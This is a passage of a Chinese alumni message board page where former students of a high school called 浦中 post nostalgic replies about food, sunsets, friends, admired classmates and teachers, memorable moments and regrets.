鸭翅和鸡排yyds</p><p>Re（周可儿）：高中的每一段关系，上了大学之后，每一段关系都由利益联系，没有无条件和你成为朋友的人了。</p><p>Re（猛村伞兵一号）：还能一起再穿一次村服一起走在进诚广场的大道上吗</p><p>Re（猛村伞兵二号）：在浦中四年收获了一群非常珍贵的兄弟，一辈子的好朋友，猛村yyds！村服走起来！</p><p>Re（猛村伞兵三号）：猛村，建立于初三那年，后面陆陆续续有新成员加入，目前已有11人，很奇怪的一群人，似乎共同爱好很少，可是关系一直很好，彼此不为利，只是知己。猛村yyds！</p><p>Re（猛村伞兵四号）：还能一起在浦中回家的路上“赶鸭子”不？猛村yyds，带给我好多美好的回忆😍</p><p>Re（猛村伞兵五号）：一生知己难求，斯世当同怀视之，与猛村的好兄弟相遇，是我一生的幸运，待到重逢，必与村服同行，猛村yyds！6</p><p>Re（猛村伞兵六号）:猛村是一个温馨的家，每个人都很好，呜呜呜。</p><p>Re（猛村伞兵七号）：表示我也想要村服。</p><p>Re（长安必安）：怀念阿桐哥带的肠粉早餐，巨好吃 还有像冰山的白云，绮丽的晚霞 熄灯后宿舍的课堂</p><p>Re：永远也忘不了桐哥的恩泽</p><p>Re（五班不知名同学）:想念排球场！</p><p>Re（大学特困牲）：怀念很多很多，好吃又不贵的饭菜、好看又常见的朝霞晚霞、好玩又好笑的活动。最怀念的是那帮人那段日子，上课时时而认真时而神游的惬意，下课时一堆人在走廊聊天打趣的日常，下午在排球场打排球的快乐，洗澡时阳台一堆人一起唱歌的欢乐。当时只道是寻常，谁知明日已两乡，甚至两分钟就可以跑上教室的这段路程我都很怀念</p><p>Re（复读生）最怀念复读的时候陪着我们的老师(ღ˘⌣˘ღ)</p><p>Re：大浦中早餐，多种多样，又便宜</p><p>Re：3我要分享晚霞，还有彩虹</p><p>Re:想念三叔栋哥立冬给我带的溢香楼的包子还有腻腻的炒面（时泪） </p><p>Re：楼上说得好</p><p>o Re（人民大会堂）:想念每天晚上的晚自习第二节下课去操场玩游戏，在操场跑来跑去踩影子，拿望远镜看月亮🌙</p><p>Re：怀念九15班的所有同学以及黄色的那只鹦鹉</p><p>Re:怀念浦中便宜的伙食和所有爱我的以及我爱的人。</p><p>Re：陈汉俊你个傻逼！！！！！！！</p><p>Re：怀念那个西瓜奶，现在回去买再也没有那个味道了。</p><p>Re（to Ocean）:怀念有你的每一帧，晚自习借着病假一起坐电动车去绕江边兜风，晚自习不上课去逛操场，次次周日的考试早退，悄咪咪的不请假的就回家，班门前摇花手，一起上台表演节目，一起做三明治，一起无效晨跑哈哈哈哈，好多好多以前看来sb的行为，现在都是美好的回忆啊，我们曾经从认识到如今天各一方，但我心里总会留有你的位置，我们彼此是世界上的另一的“我”，我们各自努力，顶峰相见，最后一句：真的好幸运能和你度过美好的青春岁月，你的包容与温柔是四月春风，希望你明媚如风。</p><p>Re 怀念走散的友情 死去的爱情 逝去的青春</p><p>Re: 肉包，榨菜粥，煮粉，鸡排，鸭腿……所有浦中的一切</p><p>Re:怀念鸭哥那帅气的英姿</p><p>Re:rwj yxc zt pzh 四大天王，忘不了啊，哈哈哈</p><p>Re:很怀念浦中的晚霞，太漂亮了。</p><p>Re:你们</p><p>Re:想念浦中的免费饭票，大鸭腿，浦中的晚霞，更想念曾经在浦中的日子</p><p>Re:晚霞，友人，鸭腿，晚风，炙热，真情实感</p><p>Re:浦中的鸡腿，鸭腿，鸡排还有云吞！</p><p>Re:（一枚外宿生）最怀念校门口早上两块钱一份的冻粉！配上榨菜绝绝子！！还有下午的烤面筋、酸野和台湾饭团真的都好好吃啊！超想吃！！！</p><p>Re:浦中鸭腿跟烤肠yyds！</p><p>Re：楼上加一，还有老莫这个帅帅的老男人，我的大可爱同桌们，沙雕舍友，日渐秃头魅力不减不减的精致辉哥，我的多肉。美貌动人的大明明，幽默风趣的钟老师，还有神奇的老龙，一切的一切仿佛还停留在昨日，怀念不如相见，未来再见。</p><p>Re：怀念浦中的一切。</p><p>Re：怀念辛勤付出的老师，怀念那时候的我们</p><p>Re（橘子鸭）想念我在那儿好朋友，认识她们真的很幸运</p><p>Re:（这里是qqqqqqs）怀念曾经一起闹一起笑一起打羽毛球一起逛操场一起课间泡面皮吃的你们，我好想你们啊！！寒假一定要见面哦！！</p><p>Re：怀念浦中的晚霞，和好朋友在下第一节晚自习去逛操场。</p><p>Re:怀念那一群人</p><p>Re:怀念一大群人（纸巾、小红、东淋姐姐、金鱼、em,和扭扭……）</p><p>Re:怀念浦中的晚霞，怀念14班的小伙伴，想见见那个大傻逼，想你了，想你们了。 </p><p>Re:想念浦中的走廊了，因为走廊总是很热闹，走廊也能看到自己想看到的人和期望自己的未来 。</p><p>Re:高三18yyds！！想你们呜呜呜呜呜呜呜呜呜</p><p>Re：高三18！！！！！！！！！</p><p>Re：怀念和喜欢的那个人一起走操场，一起吹晚风，一起看星星⭐</p><p>Re:怀念最好的同桌——黄柏灵，吴婷婷……</p><p>Re:怀念浦中最好的老师们和神奇的天空</p><p>Re（波吉）:因为排球聚在一起的，莫名都成为了好兄弟，虽然有些人的名字我到现在还不知道</p><p>Re:怀念最好的老师：韦老师</p><p>Re：怀念晚自习课间的操场，和朋友们一起散步唠嗑</p><p>Re：门口的冻粉，浦中的晚霞是我见过最美丽的就是说，没有之一。还有彩虹哥，还有平平，还有我们班那些大可爱。</p><p>Re：校门口的冻粉、浦中的晚霞、浦中的云吞、饭堂的鸭腿、波波老师的数学课&amp;达达的数学课……太多太多值得怀念的东西了</p><p>Re：怀念浦中的人和事！</p><p>Re:[17班]怀念高二的时候大家一起为老师准备礼物给老师写信，静姐说会把我们的信放在文件夹里好好保存，这句话我一直都记得。那天我们在教室一起合唱《你就不要想起我》把明明唱得眼水出，给周新选了一首《精忠报国》场面一度十分尴尬，现在回想突然笑出声。高三又是教师节每人给老师写一句话，启实看后直呼“太真实了”大家笑得不行，一度成为班梗。高三早晨可维给过我们一段心灵鸡汤时间，虽然后面疫情原因取消了，但是那时我真的有被激励到，光明的未来就在我眼前触手可及。然后那一本轮流写的班级日志现在又在哪里呢，那时候的记忆还栩栩如生历历在目，原来一转眼都过去了这么久了。</p><p>Re:高三的时候因为一些原因没有给达达唱成，这成了我的一个遗憾。</p><p>Re:我来附上一张2021年的日晕</p><p>Re:想念彩虹哥、韦老师，我们亲爱的班主任，锡东老师，旺旺老师，还有英语老师，语文老师，都很想念他们</p><p>Re:怀念在我高中三年里出现的爱与不爱的人，他们用色彩填满我整个为了未来而奋斗的青春。</p><p>Re:浦中的一切一切 那些人那些事 免费的饭票那天向溢香楼的冲刺 鸭腿鸭翅鸡排 绿豆水 门口的冻粉 饭团 过了桥往中医院方向红绿灯路口的粉店:善良的阿姨，便宜的价格多多的肉肉 优资和惠易购阿姨给我送不完的快递 想念去超市去奶茶店去吃东西的星期天下午 想念那个每个星期天下午陪我的小姐妹</p><p>Re：想浦中的晚霞，想浦中的操场，想浦中门口的早餐，想浦中的小黑，想浦中的人，想当初的我们。</p><p>Re：想一想，好像没想到什么，可能什么都值得怀念吧，当然，除了那几天高考。</p><p>Re: 之前总想着逃离浦中，现在最怀念的日子却是在浦中的生活，朴实无华，却似水流长*</p><p>Re:怀念当年身边一个又一个朋友吧，真心相待，朝夕相处</p><p>Re:当然是一整个高中啦</p><p>Re:那必然是我最可可爱爱的同学啊！！！</p><p>Re：饭堂的鸭腿和鸭翅！小黑的杏鲍菇！</p><p>Re:想老师，想曾经一起拼搏的同学，想念以前学习的氛围。</p><p>Re:夏天，日落晚霞，操场，试卷，同学，简单又美好</p><p>Re：高瘦阿姨，凶快阿姨！（懂得楼下）</p><p>Re：最怀念北通淞哥家的饭菜😎 </p><p>Re:  怀念浦中的晚霞，怀念下课和同桌一起去操场逛，怀念cmz,wcy,lxf,lxm,zjx……这些陪我一起度过高三这段时光的朋友们</p><p>Re：怀念课间和大家出外面走廊说笑的时候</p><p>Re:2020级四班</p><p>Re：我想六常的大家了，现在在电话会议，虽然很困很困还是很想听你们的声音😢</p><p>Re:好想浦中的晚霞，以及课间的欢声笑语当然还有课间一片睡倒的盛状哈哈哈哈</p><p>Re:怀念浦中的鸭腿！夜宵的炒粉！我的排球小队！and帅哥！</p><p>Re：怀念复读的那一年！想小罗啦！</p><p>Re:怀念每天跑着上教室还迟到。</p><p>Re:怀念浦中的饭菜，又便宜又好吃，特别是鸭腿、鸭翅、鸡排、云吞(云吞YYDS，那是我吃过最好吃的云吞了，不过后来猪肉涨价了就没有卖了，不知道现在有没有)。</p><p>Re：怀念浦中的夜宵，不管是冬天还是夏天，上完了了晚自习，总爱到食堂买夜宵，大家都爱的鸡排，还有便宜又好吃的云吞，去得晚一点阿姨还会送很多很多好吃的白菜！</p><p>Re:想念浦中每月一次的免费午餐了还有每天下午的晚霞，真的超好看！！！还有浦中的冬天，我们一起坐在前排互相取暖，用📰在桌纸前面挡风的场景，周六晚的新闻联播时间，我想那是最快乐最放松的时光了，大家一起喝着奶茶，吃着外寝同学买进来的各种美食……</p><hr><h2 id="在浦中见过的帅哥美女"><a href="#在浦中见过的帅哥美女" class="headerlink" title="#在浦中见过的帅哥美女"></a>#在浦中见过的帅哥美女</h2><p>Re:2020高三九班的三叔</p><p>Re：楼上说得好</p><p>Re:九班三叔超级好看的!!!</p><p>Re:啥美丽金多多水卡三叔😍</p><p>Re：梁雯瑜真好看！！！</p><p>Re: 悄咪咪地说一声，张峯</p><p>Re:李佳茵！我觉得她好好看</p><p>Re：我的好朋友们都很好看😍</p><p>Re：林汶锦啊啊！她超漂亮啊！令人心动</p><p>Re:梁东淋简直就是仙女下凡</p><p>Re：莫菲简直就是仙女下凡</p><p>Re：李灿兰老师简直就是天仙下凡</p><p>Re :李灿兰老师简直就是女神👏👏👏</p><p>Re：灿兰姐姐好美</p><p>Re：兰姐简直我女神！‘</p><p>Re（小桃呀）：所有老师都美美哒，帅帅哒🤭15班有很多美女帅哥！！！还有还有，我的好朋友都很好康！！😋</p><p>Re(橘子鸭):其实韦森长得是真的好看，还有黎薇长得也真是可爱</p><p>Re(咸鱼):我爱阿波！</p><p>Re：阿波是我的！</p><p>Re:大爱王国波，爸爸是永远惦念着儿子的</p><p>Re:焯！不要和我抢兰姐好吗！</p><p>Re:杨金怡yyds!</p><p>Re:咱就是说兰姐啊，超好看，超喜欢</p><p>Re:杨金怡和香香！</p><p>Re：高三五班米思权、管星智，高三十五班廖祥志、许育榕</p><p>Re：香香，林汶锦、韦嘉怡（她们三个真的超级超级好看）</p><p>Re：我最爱的劳世琳</p><p>Re：包运老师好美！</p><p>Re：小学弟（虽然后来发现他不是最帅的哈哈哈哈哈哈没错移情别恋了哈哈哈哈哈）</p><p>Re:表白黎薇，真的好仙女</p><p>Re（长安必安）：我爱宁梓欢和漂亮学姐</p><p>Re：表白黄芷钰！！！人真的敲好敲好看！！！我真的太爱她了！！！啊啊啊啊</p><p>Re：我爱我的劳世琳papa，可盐可甜😚又帅又美</p><p>Re（liability）：我永远都是刘莹的迷妹！！！疯狂打call</p><p>Re：刘莹！气质型美女！</p><p>Re（kk）：必须是吴宇倩！好叭给我冲</p><p>Re:  莹姐莹姐yyds</p><p>Re:不知道叫啥名字，高三时候高一高二家长会看到的帅哥😭惊为天人（猜测是高一的男同学）。</p><p>Re：庞诗琦和林汶锦坠好看！绝美！！</p><p>Re: 当然是人见人爱，花见花开，车见车爆胎的小短腿郭诚丽啦！</p><p>Re:我海怡姐必占一席之地！！！</p><p>Re:李灿兰老师气质女神！</p><p>Re:灿兰灿兰跟厌厌，都好爱！！</p><p>Re:灿兰yyds</p><p>Re：钟钦老师！！YYDS！！！美死了！！人超好！！</p><p>Re:还得是我惠姐（郑惠老师）</p><p>Re：帅哥当然是跳舞和写数学题的小米子！很难不爱哈哈哈</p><p>Re（正气）啥也不说了，龙！奕！光！！牛币！！</p><p>Re:那我必须提名高三22班***lml***，被人在山上喊过名字的女人【doge】排面刷起来</p><p>Re（kk）: 丹姐yyds，你永远是大姐姐，我pick你噢。</p><p>Re：表白三木子和橘子！！！！她们敲漂亮！！人敲好敲好！！！</p><p>Re:黄秋渝不能少                    </p><p>Re：16班光头yyds！！！</p><p>Re:还有韦森大美女爱了爱了 </p><p>Re:还得是我厌厌啊哈哈哈哈哈好爱她！</p><p>Re（远野）：李田所！</p><p>Re: 我们莹莹子和梦梦子不能少好吗</p><p>Re（半仙）：珊姐珊姐好想你！</p><p>Re：见过最美丽的就是我自己哈哈哈哈哈哈哈</p><p>Re:陈奇思、覃梦怡、李雅琪、庞礴、刘秋明、刘金霞、杨承儒、林超业……太多太多帅哥美女了。</p><p>Re:怎么能没有可可爱爱的唐芷晴呢</p><p>Re:童姐童姐！！！！</p><p>Re:深情表白包老师！包老师的颜我太吃了！</p><p>Re:我们大宝必要上榜！！！！！            </p><p>Re：楼上+1原高三八班刘谋路过，大家顶起来！</p><p>Re:我的传奇姐妹，老翁！！！</p><p>Re：我的好兄弟，隆哥，靓仔一个！！！</p><p>Re: 唔……有点难说</p><p>Re:我们钟青姐姐怎么能不上榜呢！还有惠娟老师！！这么温柔体贴的老师必须安排上！</p><p>Re:卢虹霓啊啊啊啊啊啊啊啊之前晚会的时候简直天仙下凡啊😍😍</p><p>Re:楼上+1+1+1+1+1</p><p>Re:灿兰老师是我见过最有气质最漂亮的语文老师。</p><p>Re:啊富哥！</p><p>Re:没人提潘小娜吗？！她超美的！</p><p>Re:楼上我必须赞同，我吃她的颜从小学到高中</p><p>Re：我超级吃韦老师的颜值的！！</p><p>Re：骚猪 漂亮，想你们啦！！！</p><p>Re：莫天华（莫少）必须占一位！！！老莫好帅🤤🤤🤤</p><p>Re:那必须是黄岩。</p><p>Re：楼上说的好，很难不赞同。</p><p>Re：一个男孩子，长得很像初恋。</p><p>Re：当然是芷君啦，人美心善，怎么能不喜欢，简直太喜欢了！</p><p>Re（媛媛）:啊啊啊谢谢楼上的夸奖，哈哈哈并没有那么好啦 接下来我要表白的是我高一的同桌Pang媛~真的就是有求必应，在没有淘宝的那些日子，在回南天难熬的那些日子，在寒冷的那些日子里……总会在平淡无奇的日子里给我们制造欢喜，感谢她一直默默陪伴在身边，人真的超好，如果能重回那个时候，我会更加珍惜与她在一起的时光</p><p>Re 张三丰必上榜好嘛（狗头)</p><hr><h2 id="最难忘的（一节课，一个瞬间，一眼风景……）"><a href="#最难忘的（一节课，一个瞬间，一眼风景……）" class="headerlink" title="#最难忘的（一节课，一个瞬间，一眼风景……）"></a>#最难忘的（一节课，一个瞬间，一眼风景……）</h2><p>​                 <img src="http://cdn.lmark.cc/img/PAIi2HQNgeta8bU.jpg">                         <img src="http://cdn.lmark.cc/img/UWTKcr7wICNLxd9.jpg">                           </p><p><img src="http://cdn.lmark.cc/img/nAsq9UaezOX5Dcu.png">      </p><p>​                 <img src="http://cdn.lmark.cc/img/PxqNnTjeVrUmRwi.jpg">                         <img src="http://cdn.lmark.cc/img/q6Oh9peIHYZTWDP.jpg">        </p><p>​                 <img src="http://cdn.lmark.cc/img/f5tXcHejpPWNm1V.jpg">       </p><p><img src="http://cdn.lmark.cc/img/vDOgC5RnFIPKlZc.jpg"> </p><p>Re：浦中的晚霞永远让人心动 </p><p>Re:那个男生从电脑那弄完东西，潇洒下来的一瞬间，那一眼让我喜欢到大学开学。</p><p>Re:周六一起看觉醒年代那会，我敢打赌绝对难忘，哭成🐶了</p><p>Re：四年没有同桌，各科老师的特别“爱护”，哈哈😄。</p><p>Re:小妃给每一个人买的小蛋糕。</p><p>Re（波吉）:同上（让我站的两节课也可不马虎）</p><p>Re:小妃真的很有心，把我们当做自己的孩子，🍰真的很可爱。</p><p>Re:小妃让我们唱了两节课的歌，自由发挥，很好的回忆</p><p>Re:高三九班课代表集体整活的那个晚上，后来还被新军dk了</p><p>Re：小妃让我们罚站了两节课 哭唧唧</p><p>Re：有过最难忘的回忆都关于小妃</p><p>Re:   站两节课站得真的想死Σ</p><p>Re:兰姐的语文课yyds！</p><p>Re:那节要说方言的语文课，念完就分班了</p><p>Re(小桃呀)：刚搬去高三教室的一个晚上，巴总给我们班每个人都准备了凉茶！！！敲苦！！！放寒假的那天上午班里的活动！！！还有还有，15班被布置的敲好康！！！还有还有跟我的好朋友们的每一次聊天！！！</p><p>Re(咸鱼):洛！都可以洛！</p><p>Re（liability）：别洛啦！！！！</p><p>Re:如果睡不着，还想回到高二五班“失眠飞行”</p><p>Re：阿昌回归上最后一节化学课！！好感动</p><p>Re（周可儿）：大家瞒着我给我买蛋糕过生日，这辈子有他们真的很好！越长大越发觉得可贵。猛村yyds！</p><p>Re:梦回昌姐上的化学课与班会，与高三即将毕业的时候再一次来我们高三八班给我们加油打气</p><p>Re:兰姐语文课永远滴神，好玩有趣又学到知识。</p><p>Re（给春）：我高一的时候，冬天忘记带被子来学校，我的上铺感受到我睡觉在发抖，直接搬被子下来和我一起睡，现在想起来还挺泪目的。</p><p>Re:最难忘的就是猛村的好兄弟了吧。</p><p>Re:拍过这么多屁股，还是喜欢拍李金州的！</p><p>Re：吴兴国是我见过最认真努力的男孩子！</p><p>Re:  楼上加一，两个字：佩服</p><p>Re(kk):最难忘和海怡，梦梦子同桌的日子，真的很快乐。</p><p>Re:爱你们昂，莹莹子，海怡宝宝。</p><p>Re：高一的校运会吧</p><p>Re：当然是十八岁生日！</p><p>Re:高二晚读一起看晚霞的时候吧</p><p>Re 晚霞 她 一眼万年</p><p>Re：难忘每一次苏主任认真的给我们上班会课，难忘那些手语舞，难忘苏主任激励我们考上985时的激情澎湃</p><p>Re（木子）:喜欢高三时和我的同桌（桃子和橘子）一起在墙上贴着自己的愿望，下课一起分享零食还有分享我们的小秘密的时候。还有为了给我庆祝生日，三个人一起请假出去happy,当然还有她们两给我的的小纸条，我会永远保留，因为那是你们对我的祝愿。还有一个特别重要的人（黄棋棋同学），感谢一直以来你的陪伴，真的超级喜欢你，觉得你真的有一个善良又有趣的灵魂！永远记得我们的每一次谈话！！</p><p>Re（D栋406）永远忘不了无数个夜晚他的声音一直陪伴我直到入眠，他那此起彼伏的旋律，让我们整个宿舍都舍不得入睡，深怕再也听不到了，现在到了大学，再也听不到那熟悉又动听的呼噜声了，真的很怀念</p><p>Re：楼上蚌埠住了，我三个室友两个和他一样让我睡得可香了</p><p>Re:怎么说，最难忘的是18年那个星期六，凌晨四点爬起床去参加马拉松比赛。5公里42分钟真的累的要死U•ェ•*U但是最后和大家一起抢舞台唱歌拍合照，真的有趣。</p><p>Re：数学课看小说</p><p>Re：忘不了那一群曾经跑到文昌塔上面大喊我名字(lml)的那群朋友，忘不了在浦中交到的那一群现在各奔赴天南海北的朋友</p><p>Re:楼上，想你(⸝⸝•‧̫•⸝⸝)</p><p>Re: 哈哈哈哈哈哈哈哈偷溜去红绿灯吃蒸粉的日子</p><p>Re：语文课睡觉，数学课睡觉，英语课睡觉，历史课睡觉，地理课睡觉，政治课睡觉。睡觉，睡觉，睡觉 。</p><p>Re:楼上怎么感觉是在描述我的高中生活！</p><p>Re: 天天熬夜看小说和同学嘻嘻哈哈的日子    </p><p>Re:想和小伙伴们回去再打排球！！！！</p><p>Re:难忘小伙伴们下课偷摸用自媒体放歌的每天</p><p>Re:晚上和朋友一起去操场，真的不能在爱了。我再也没有看过比那个时候更漂亮的晚星，也再也没有遇见过比那个时候更爱的人，也再也不会比那个时候炙热和满怀一腔孤勇了</p><p>Re:毕业典礼那天，我在第一排哭了好久</p><p>Re：每天期待他路过我们班，每次跑操都寻找他的身影，有一次一整天都等不到他的身影，心情沉重了一天，就是很担心，后来晚自习又在走廊看见了他的身影，就觉得好开心好开心（2020）</p><p>Re:人在郑州，对象还在浦中，又是异地恋艰难的一天😩😩</p><p>Re:怀念那么多的人和事，高中三年是我最好的三年啊，有那么多那么好的朋友，还有偷偷喜欢过一个那么阳光的少年，谁知道到今天所有人都没放下，只是不可能回得去了。期待十年之约吧。</p><p>Re：想念浦中晚上的操场。</p><p>Re:难忘小海上课钓鱼，难忘小海癫头 我们笑的跟个傻子一样。</p><hr><h2 id="假如没有疫情，荣获一次探监机会，你想回浦中看看什么"><a href="#假如没有疫情，荣获一次探监机会，你想回浦中看看什么" class="headerlink" title="#假如没有疫情，荣获一次探监机会，你想回浦中看看什么 ?"></a>#假如没有疫情，荣获一次探监机会，你想回浦中看看什么 ?</h2><p>Re:那是必须的!探监的快乐你不懂😏</p><p>Re:那一定是浦中的风景呀，尤其是晚霞</p><p>Re:浦中帝高啊，回去看看小罗?</p><p>Re：想看小罗+1，想看看那些很可爱的老师</p><p>Re：看苏总，苏总牛皮</p><p>Re:看看庞友😭想看庞友打排球</p><p>Re：我也是呜呜呜呜好想好想他，庞友永远的神！</p><p>Re:好想看小罗+1，还有看看昌姐</p><p>Re:想兰姐</p><p>Re（小桃呀）：想探巴总🤣and所有人</p><p>Re：想啊昌</p><p>Re:昌姐，@昌姐，疯狂打call </p><p>Re：看看拆了没有</p><p>Re: 想回去看阿罗和小罗，还有昭炬哥😊😋</p><p>Re:想念教过我的老师们，老师们真的都好好的😊😊</p><p>Re：想见旺旺老师！想念易大师</p><p>Re:想见高三的所有老师和小罗</p><p>Re：想去看看彩虹老师hhh</p><p>Re：看看苏总👀</p><p>Re: 看晚霞</p><p>当年的人与事。</p><p>Re：想见见好久不见的人儿，想见惠惠，想见丽芳，想见lili，想见那个很搞笑的数学老师wqz。</p><p>Re:想去看看我的老师们还有仍在努力的吴银霞小朋友</p><p>Re:回去看韦老师</p><p>Re:回去看看还在努力的李心敏大宝贝                            </p><p>Re:回去看看老师们，再去文汇楼的教室看一次夕阳</p><p>Re:看晚霞呀，还要拍下来打印成明信片做纪念。</p><p>Re: 看他们学习的傻样</p><p>Re:想回去坐在教室里睡觉 看看我的老师 还有和好朋友躺在操场上看星星</p><p>Re：回去看看那张写满她名字的桌子</p><p>Re:回去复读</p><p>Re:想回去再看看：说“想死我们了”的启实，说“”龙腾花开了，回去温习数学公式”的波波老师，祝我们未来可期的包包女士，祝我们学习爱情双丰收的香香老师，说“i miss you,too”的海燕姐姐，说“永远忘不了二十二班的我们”的老莫，还有亲切的明明，温柔的荣荣，总是面带微笑说要为我们护航的达达，想回去看看浦中的操场，浦中美丽的晚霞……浦中的每一个角落都想回去再看一看</p><p>Re:梁少！！！！梁少！！！梁少我爱你！</p><p>Re：老师们！</p><p>Re: 怀念小梁(梁宗鹏)的数学课了，上你的数学课，一年，我真的没有再睡过觉！！你真的也是超级优秀，超级爱你！！</p><p>Re：看浦中。</p><p>Re: 看浦中+1</p><p>Re：没有被梁老师教过，但是老是去找他解答问题，梁老师真的很优秀！又幽默，非常喜欢他</p><p>Re:那肯定要回去看看呀，看看海燕姐、坚哥、敏哥、高兴利老师…好多好多，看看走廊的花盆长了什么🌸🌸了</p><p>Re:看看老师，再看看环境。</p><p>Re:水哥和包老大</p><p>Re：想回去看老婆，给老婆带螺蛳粉和奶茶，还有傻逼男远离我老婆，老婆2022顺顺利利！</p><p>Re:永远忘不了昭炬哥的next  student。</p><p>Re:想念昭炬哥有趣的课堂与课后</p><p>Re:昭炬哥想复读机了。</p><p>Re：我也好想昭炬！！！他好可爱！！！</p><p>Re:楼上＋1呀😄</p><p>Re:楼上+2！！</p><p>Re：想回去见小罗！</p><p>Re:是老罗好吧</p><p>Re:去探监小姐妹，然后她们都叫我学姐    </p><p>Re:去探望我的老姐们，看看龙龙，敏敏子       </p><p>Re:想去饭堂吃夜宵。   </p><p>Re:回去看看易大师，还有旺旺主任啊🌝还有所以教过我的老师们，他们都很好啊！</p><p>Re:想坐在五班的教室。</p><p>Re:回去看看把我们从高一带到高三的全哥，坐下来好好和他聊聊天 </p><hr><h2 id="最遗憾的事"><a href="#最遗憾的事" class="headerlink" title="#最遗憾的事"></a><strong>#最遗憾的事</strong></h2><p>Re:在她最需要人安慰的时候，我没出现，离得远远的，慢慢将她推开</p><p>Re：因为疫情取消了谢师宴，高考结束后全班没能好好聚一下就各奔东西了</p><p>Re:还是没有勇气给你道歉cjs,或许是我v太懦弱了，再次见到还是会逃避，就只能这样敲敲的给你道歉吧。</p><p>Re:没能拼尽全力迎接高考吧，挺遗憾的，怎么不逼自己一把</p><p>Re：最后还是没能拿到想要的成绩吧</p><p>Re:   谢师宴取消了。好可惜。</p><p>Re：连一个表白的机会都未曾有，你始终是我遥不可及的光</p><p>Re:高考完那一晚，谢师宴因疫情而取消了，呜呜呜</p><p>Re（小桃呀）：没能让男神认识我！！！唉～没能考到想要的成绩～谢师宴的取消！！！！</p><p>Re：败给了现实，没能成为想成为的样子。</p><p>Re: 辜负了学长，没能遵守承诺考上那个大学。</p><p>Re：没有遗憾，一切都是最好的样子，谢谢我最好的朋友们的陪伴</p><p>Re:很遗憾，这是我很久都不能再回顾的过去。</p><p>Re: 高三时候松懈了，感觉自己不够拼</p><p>Re:初三没有去别的学校</p><p>Re：没有好好珍惜当时的日子，也没有买一台相机好好记录我们的日常u</p><p>Re:遗憾我平凡的青春</p><p>Re：好遗憾，没能好好告白，没能好好说再见</p><p>Re：遗憾自己在最后关头松懈，遗憾没有勇气复读，遗憾自己平凡的青春</p><p>Re：嗯，你终于找到一个满眼都是你的女孩子啦</p><p>Re：遗憾没有复读，遗憾考的太差，遗憾我的心意没有得到回应。</p><p>Re：同样遗憾没有复读</p><p><em>Re**：复读后，还是考差了，没有达到理想的分数</em></p><p>Re: 高中时心里一直藏着一个旧人 ，没有新人进去，现在想想好像也错过了许多</p><p>Re:遗憾的太多了，比如因为疫情不能过六一儿童节。苏主任明明给我们承诺过的“明年你们也会有”，谁知道明年会变成那样呢</p><p>还有没能和他好好说声再见</p><p>Re:遗憾他没有考第一</p><p>Re:没能谈场恋爱</p><p>Re:以前都是暗恋，读了大学，可以明恋啦~</p><p>Re:没能告诉他我喜欢他 没能全力以赴考到211 没能好好爱自己</p><p>Re:没能拼尽全力好好学习，也遗憾当初没回去复读</p><p>Re：想在高三20班的教室里拍最好看的毕业照！拍毕业照的那天，刘海太油了！如果可以想再来一次！！！</p><p>Re:楼上+1，我也好想重拍毕业照🥺</p><p>Re:没能告诉他我喜欢他+1，没有六一活动只有无穷无尽的打不完的排球</p><p>Re：很遗憾毕业那天没能和你好好拍个照，很遗憾曾经答应过你我们不再吵架却食言了，很遗憾没能带你去blingbling吃蛋糕，很遗憾没能和你去看荧光海，很遗憾以前天天嬉戏打闹的我们现已不再联系，真的很遗憾</p><p>Re：没考上全市前二（</p><p>Re：遗憾没有一张照片</p><p>Re:高中一直在等一个人，结果错付;了，很后悔三年都在等渣男</p><p>Re：没有百日誓师，没有成人礼，真就期待了三年。</p><p>Re: 复读了 有了20年没有的百日誓师，六一活动 可是身边的人不是他们了 也没有考出理想的成绩数学也没有进步多少 没能去到我想去的城市 没能和我最喜欢的小强老师合影。</p><p>Re:没有在最后的冲刺考上想去的大学和城市       </p><p>Re :好像我还是没成为自己想要的样子。</p><p>Re：遗憾没有谢师宴，遗憾没有没能好好珍惜当初，遗憾没有好好说再见，遗憾没能好好发挥</p><p>Re: 没有处理好和朋友的关系，做错了很多决定，到头来一无所有</p><p>Re：永远都不要触碰暗恋，必死无疑。</p><p>Re: 好遗憾 只跟你说一次话</p><p>Re：没有好好对待一个男孩子的满心欢喜</p><p>Re:没什么遗憾的，过去了都是过去了，以前真的很好 </p><p>Re：遗憾不多不少，留点遗憾，青春才更让人回味，或许这就是遗憾吧，也都挺好。</p><p>Re:那个时候他问我是不是喜欢他，我却没敢回答他是。</p><p>Re:努力却找不着调，认真了三年却没有活成自己想要的样子。</p><p>Re:怀念浦中的人了，曾经的高三一班，我想你了（高庆老师，谭慧莲老师，宁邦青老师，陈玲老师，吴小华老师，还有我最爱的英语老师朱义兰老师）</p><p>Re:最遗憾的事情就是高考前给她的情书吹进了风里，吃完毕业宴欲寻她，从她身旁走过，却不敢再打一个招呼</p><p>Re:还没开始就结束了所有</p><p>Re:谢师宴，没能和她说句抱歉</p><p>Re：高考结束没鼓起勇气开口认识他</p><p>Re:2020年，没有百日誓师，没有六一活动，少了很多东西</p><p>Re:错付了一个人，不应该这么卑微</p><p>Re:没有活成我想要的自己，没有认认真真跟某人道过歉，和宁某人，吴某人冷战了一年，最后还是没解开这个冷战</p><p>Re:遗憾的是没有频繁地记录生活</p><p>Re：我不应该赌！</p><p>Re:没有好好努力，也没有勇气向喜欢的男生表白</p><p>Re:遗憾的是谁也不愿开始  </p><p>Re:遗憾自己为什么当时满脑子都是他，而没有好好复习；遗憾自己没有勇气去复读，考上一个让爸妈骄傲的大学；遗憾他浪费了我三年的青春……</p><p>Re：很遗憾当时满脑子都是一个叫WYL的男孩子，好像所有的努力都是为了能和他考上同一个大学，每天很早去教室，很晚离开，总感觉他会看到我在努力，即使我们不在同一个学校……最后等到了，发现感动的却是我自己，他还是离开了我，走远远的……遗憾自己没有考上理想的大学，遗憾没有认识更多同学，遗憾没有好好和你说再见。</p><p>Re:遗憾的是没能在高中三年里和老师同学们好好处，如果能回到过去，我一定会好好把握，珍惜身边的每个人每件事……还有就是寻找适合自己的学习方法，再努力学习一把</p><hr><h2 id="有关浦中的小秘密"><a href="#有关浦中的小秘密" class="headerlink" 